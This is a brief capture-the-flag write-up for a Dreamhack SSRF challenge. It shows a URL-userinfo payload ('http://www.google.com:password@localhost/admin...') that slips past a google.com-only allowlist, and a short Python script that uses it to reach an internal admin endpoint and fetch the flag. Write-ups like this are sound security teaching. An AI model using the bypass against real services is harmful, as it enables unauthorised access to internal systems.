# Broken is SSRF possible
This challenge involves ssrf

## Solve
Exploit flow: ssrf -> change global flag value -> submit flag value and get chal's flag

Problem: 
- /check-url only allow url that go to www.google.com -> use payload like: `http://www.google.com:password@localhost:80/admin...` this treat `www.google.com:password` as credential that is sent to the localhost
- /admin and check url only allow post method, but still get data from url args -> i use a python script make those requests

## Solve script
```python
import requests

url = 'http://host8.dreamhack.games:15631/'
json = {
    'url': 'http://www.google.com:password@localhost/admin?nickname=johnpork'
}

headers = {
    'Content-Type': 'application/json'
}
response = requests.post(url+'/check-url', json=json, headers=headers)
print(response.text)

flag = requests.post(url+'/flag?nickname=johnpork').text
print(flag)
``` 
